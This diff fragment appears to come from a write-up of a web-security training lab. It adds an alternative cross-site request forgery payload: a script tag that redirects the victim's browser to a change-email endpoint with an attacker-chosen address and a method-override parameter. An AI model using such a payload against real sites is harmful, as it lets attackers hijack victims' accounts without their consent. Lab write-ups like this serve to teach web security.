@@ -67,6 +67,11 @@ HTTP/2 200 OK
 </body>
 </http>
 
+# You can also use this:
+
+<script>
+    document.location = "https://0a06007503b52c448040031600db0037.web-security-academy.net/my-account/change-email?email=bora@gmail.com&_method=POST";
+</script>
 ```
 
 
